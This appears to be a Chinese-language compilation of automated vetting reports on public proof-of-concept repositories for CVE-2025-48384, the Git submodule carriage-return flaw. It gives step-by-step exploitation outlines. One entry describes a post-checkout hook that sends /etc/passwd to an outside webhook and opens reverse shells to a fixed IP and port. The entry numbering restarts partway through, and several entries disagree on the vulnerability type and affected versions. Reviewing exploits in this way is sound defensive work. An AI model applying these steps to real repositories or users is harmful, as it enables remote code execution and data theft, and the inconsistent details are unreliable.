**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并且执行带有漏洞的Git版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对换行符（CRLF）处理不当。当初始化子模块时，如果子模块的路径包含尾随的CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和PoC代码，该PoC是有效的。攻击者可以通过创建一个包含恶意配置的 Git 仓库，诱导用户克隆该仓库，从而触发漏洞并执行任意代码。

提供的PoC代码包含以下文件：
*   `README.md`: 简单的README文件，用于初始化子模块。
*   `post-checkout`: 一个shell脚本，用于执行任意命令，此处是`echo`和`id`命令。

**投毒风险：**
分析PoC代码，未发现作者隐藏的恶意代码。`post-checkout` 脚本的功能仅为打印 `id` 命令的执行结果，用于验证漏洞的存在。**因此，投毒风险为0%。**

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库。该仓库的子模块路径包含尾随CR字符。
2.  攻击者创建一个符号链接，将包含CR字符的子模块路径指向 `.git/hooks` 目录，或者子模块下的 `.git/hooks` 目录。
3.  攻击者将包含恶意代码的 `post-checkout` 脚本添加到子模块的 `.git/hooks` 目录中。
4.  攻击者诱导用户克隆该恶意 Git 仓库。
5.  当用户克隆仓库并初始化子模块时，由于Git对CR字符处理不当，子模块会被检出到错误的位置，同时 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**项目地址:** [Anezatraa/CVE-2025-48384-submodule](https://github.com/Anezatraa/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对回车符（CR）处理不当。攻击者可以构造包含恶意配置的 Git 仓库，其中子模块路径包含尾随 CR。当用户克隆该仓库并初始化子模块时，Git 会错误地将子模块检出到错误的位置。如果攻击者在错误的位置设置了一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，那么在检出后，该 hook 脚本就会被执行，从而导致任意代码执行。

**POC分析：**

提供的 POC 代码 `/tmp/569f31ff6b5166501e6218f8839f5620/post-checkout` 是一个 post-checkout hook 脚本。该脚本的作用是 ping `wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`。这个行为本身用于验证漏洞是否被成功利用，攻击者可以通过监测 DNS 请求判断 hook 是否被执行。这个hook仅是验证，不能算恶意代码。

**有效性：**

根据搜索结果，该漏洞的PoC已经公开，并被标记为高危漏洞，利用代码结合漏洞描述，可以判断POC有效。

**投毒风险：**

提供的POC代码仅包含一个简单的ping命令，用于验证漏洞是否触发。它本身不包含任何恶意代码或后门，因此投毒风险较低，可以认为是0%。然而，实际攻击中，攻击者可能会将此 hook 替换为更具破坏性的代码。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置包括带有尾随回车符的子模块路径。
3.  攻击者在错误的位置创建一个指向子模块 hooks 目录的符号链接。
4.  攻击者在子模块中包含一个可执行的 post-checkout hook。
5.  攻击者诱使用户克隆该恶意仓库并初始化子模块。
6.  用户执行 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`。
7.  Git将子模块检出到错误的位置，并执行 post-checkout hook，从而导致任意代码执行。

**项目地址:** [ECHO6789/CVE-2025-48384-submodule](https://github.com/ECHO6789/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384-Git代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时的不一致性，具体来说，Git 在读取配置值时会移除尾部的回车符（CRLF），但在写入时，如果配置值以回车符结尾，则不会对其进行引用。这会导致在稍后读取配置时丢失回车符。

**漏洞利用方式：**

1.  **恶意仓库创建：** 攻击者创建一个恶意的 Git 仓库，其中包含一个`.gitmodules`文件，该文件定义了一个 submodule，其路径包含尾部回车符（CR）。例如：`path = submodule_path\r`。
2.  **符号链接：** 仓库中存在一个符号链接，指向修改后的 submodule 路径到`.git/hooks`目录。这样可以将看似无害的目录路径重定向到 Git 钩子目录。
3.  **恶意钩子：** 仓库中包含一个可执行的`post-checkout`钩子脚本，该脚本会在 checkout 操作后执行。
4.  **诱导用户：** 攻击者诱导受害者克隆（`git clone --recursive`）该恶意仓库。
5.  **代码执行：** 当受害者执行 `git clone --recursive` 时，Git 会尝试 checkout submodule 到错误路径。由于存在符号链接，实际checkout操作会将文件写入到 `.git/hooks` 目录。`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**有效性：**
提供的 Python 脚本 `cve_2025_48384_auto_print_scanner.py` 是一个扫描器，用于检测本地或远程 Git 仓库是否存在 CVE-2025-48384 漏洞的潜在利用。它会检查`.gitmodules`文件中是否存在包含尾部回车符或`..`的路径，查找指向`.git/hooks`的符号链接，并列出可执行的钩子脚本，并显示钩子脚本内容。虽然该脚本本身不能直接利用该漏洞，但可以帮助安全研究人员或用户识别潜在的恶意仓库。结合搜索结果，可以确认此漏洞存在可利用性。

**投毒风险：**
